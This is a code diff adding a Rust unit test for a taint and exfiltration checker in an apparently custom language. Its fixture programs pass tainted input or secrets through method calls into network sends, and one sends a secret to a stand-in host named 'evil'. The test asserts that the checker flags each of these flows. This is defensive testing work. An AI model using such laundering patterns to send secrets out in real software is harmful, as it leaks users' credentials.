@@ -5670,6 +5670,47 @@ fn main() { let v = Vault { id: 1 }; v.store(secret_source("k")); }"#,
     }
 
     #[test]
+    fn interproc_transitivity_through_method_calls_is_caught() {
+        // #68: a param laundered THROUGH a method that sinks/egresses it. The joint free-fn↔method
+        // param_sinks/param_egress fixpoint + the CallExpr arms on collect_param_sinks_in_expr /
+        // expr_param_flow close free-fn→method, method→method, and value-through-method-return shapes.
+        // free-fn→method SINK.
+        let s1 = tc_ok(
+            r#"struct Runner { id: u32 }
+impl Runner { fn run(self, cmd) uses(net.send) { send("h", 80, cmd); } }
+fn fwd(r, cmd) { r.run(cmd); }
+fn main() uses(net.send) { let r = Runner { id: 1 }; fwd(r, input()); }"#,
+        )
+        .expect_err("free-fn forwarding a tainted param into a sinking method must be flagged");
+        assert!(s1.contains("ANUBIS_INTERPROC_SINK"), "got: {s1}");
+        // method→method EGRESS (needs the JOINT fixpoint — ship's summary depends on deliver's METHOD summary).
+        let s2 = tc_ok(
+            r#"struct Mailer { host: u32 }
+impl Mailer { fn deliver(self, msg) uses(net.send) { send("evil", 80, msg); } fn ship(self, p) { self.deliver(p); } }
+fn main() uses(net.send) { let m = Mailer { host: 1 }; m.ship(secret_source("k")); }"#,
+        )
+        .expect_err("method forwarding a secret into an egressing method must be flagged");
+        assert!(s2.contains("ANUBIS_INTERPROC_EXFILTRATION"), "got: {s2}");
+        // value-carry through a method RETURN into a sink (the expr_param_flow CallExpr arm).
+        let s3 = tc_ok(
+            r#"struct Wrapper { id: u32 }
+impl Wrapper { fn wrap(self, v) { return v; } }
+fn leak(w, x) uses(net.send) { send("h", 80, w.wrap(x)); }
+fn main() uses(net.send) { let w = Wrapper { id: 1 }; leak(w, input()); }"#,
+        )
+        .expect_err("a tainted param carried through a method return into a sink must be flagged");
+        assert!(s3.contains("ANUBIS_INTERPROC_SINK"), "got: {s3}");
+        // (precision) a method that DISCARDS its arg is not summarized → forwarding accepts.
+        tc_ok(
+            r#"struct Store { id: u32 }
+impl Store { fn ignore(self, x) { return 5; } }
+fn drop_it(m, x) { m.ignore(x); }
+fn main() uses(net.send) { let m = Store { id: 1 }; drop_it(m, secret_source("k")); }"#,
+        )
+        .expect("a method that discards its arg must not summarize the forwarder as leaking");
+    }
+
+    #[test]
     fn impl_method_return_secret_or_taint_is_caught_at_egress() {
         // #67: an impl method whose RETURN carries an internally-minted secret/taint (the getter/
         // accessor exfil `let k = v.key(); send(k)` / `send(v.key())`) launders past even the DIRECT
